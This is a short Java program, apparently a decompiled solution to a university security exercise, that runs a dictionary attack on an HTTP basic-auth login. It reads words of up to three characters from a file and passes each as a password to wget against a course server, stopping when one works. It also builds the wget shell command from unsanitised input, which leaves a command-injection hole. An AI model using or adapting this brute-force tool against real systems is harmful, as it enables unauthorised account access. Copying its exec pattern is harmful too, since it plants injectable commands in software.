import java.io.IOException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.File;
import java.io.InputStreamReader;
class Dictionary {
    public static void main ( final String[] array ) {
        try {
            final BufferedReader bufferedReader = new BufferedReader ( new FileReader ( new File ( "words" ) ) );
            final URLHack urlHack = new URLHack();
            String line;
            while ( ( line = bufferedReader.readLine() ) != null ) {
                if ( line.length() <= 3 ) {
                    urlHack.m00 ( line );
                }
            }
        } catch ( IOException ex ) {
            System.out.println ( "Error: " + ex );
        }
    }
}
class URLHack {
    public void m00 ( final String s ) {
        try {
            final String line = new BufferedReader ( new InputStreamReader ( Runtime.getRuntime().exec ( "wget -nv --http-user= --http-passwd=" + s + " http://sec-crack.cs.rmit.edu./SEC/2/" ).getErrorStream() ) ).readLine();
            System.out.println ( line );
            if ( line.length() == 21 ) {
                System.out.println ( "Invalid Password " + s );
            } else {
                System.out.println ( "Password is " + s );
                System.exit ( 0 );
            }
        } catch ( Exception ex ) {
            System.out.println ( " ERROR " + ex );
        }
    }
}
